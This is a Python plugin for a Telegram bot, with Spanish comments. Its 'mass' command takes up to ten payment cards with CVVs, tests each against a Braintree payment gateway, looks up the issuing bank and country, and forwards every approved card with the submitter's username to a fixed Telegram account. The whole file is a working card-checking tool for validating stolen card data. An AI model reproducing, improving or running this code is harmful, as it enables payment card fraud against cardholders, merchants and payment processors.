import time
import re
import requests
from srca.configs import find_cards, antispam, addCommand
from plugins.gates.src.Braintree_avs import Braintree2

@addCommand('mass')
def mc(client, m):
    ALLOWED_USERS = [338411613, 7389519750, 5914801650]
    APPROVED_REPORT_ID = 7389519750

    if m.from_user.id not in ALLOWED_USERS:
        return m.reply('No estás autorizado para usar este comando.')

    start_time = time.time()
    final_msg = '<b>[⚡️] Mass Gate</b>\n\n'
    msg = m.reply_text(final_msg)

    # Obtener las tarjetas desde el mensaje
    query = m.text.split(" ", 1)
    if len(query) < 2 or not query[1].strip():
        return msg.edit_text('<b>Formato: card|month|year|cvv (soporta | / , - + : \')</b>')

    cards = query[1].strip().split('\n')

    if len(cards) > 10:
        return msg.edit_text('<b>Error: Límite máximo de 10 tarjetas</b>')

    last_cc = None  # Para almacenar la última tarjeta procesada

    for card in cards:
        try:
            # Separar usando varios delimitadores
            parts = re.split(r'[|/,+:\'-]', card.strip())
            if len(parts) != 4:
                raise ValueError("Formato de tarjeta inválido")

            cc, mes, ano, cvv = map(str.strip, parts)
            last_cc = cc  # Guardamos para el bin check final

            response, emoji = Braintree2().main(card)

            final_msg += f"<b>Card: <code>{card}</code>\nMessage: {response} {emoji}</b>\n\n"
            msg.edit_text(final_msg)

            if "Approved" in response:
                client.send_message(
                    chat_id=APPROVED_REPORT_ID,
                    text=(
                        f"<b>Approved Card\n"
                        f"Card: <code>{card}</code>\n"
                        f"Message: {response} {emoji}\n"
                        f"From: @{m.from_user.username}</b>"
                    )
                )
        except Exception as e:
            final_msg += f"<b>Card: <code>{card}</code>\nMessage: Invalid ({str(e)})</b>\n\n"
            msg.edit_text(final_msg)

    time.sleep(1)

    # Consulta BIN de la última tarjeta procesada
    if last_cc:
        try:
            req = requests.get(f'https://binlist.io/lookup/{last_cc[:6]}').json()
            elapsed = time.time() - start_time

            final_msg += (
                f"<b>• Bin: {req.get('scheme', 'N/A')} {req.get('type', 'N/A')} {req.get('category', 'N/A')}\n"
                f"• Country: {req.get('country', {}).get('name', 'N/A')} [{req.get('country', {}).get('emoji', '')}]\n"
                f"• Bank: {req.get('bank', {}).get('name', 'N/A')}\n\n"
                f"• Pxs: Live ✅\n"
                f"• Time: <code>{elapsed:0.4f}'s</code>\n"
                f"• From: @{m.from_user.username}</b>"
            )
            msg.edit_text(final_msg)
        except Exception as e:
            msg.edit_text(final_msg + f"\n\n<b>Error al obtener BIN: {str(e)}</b>")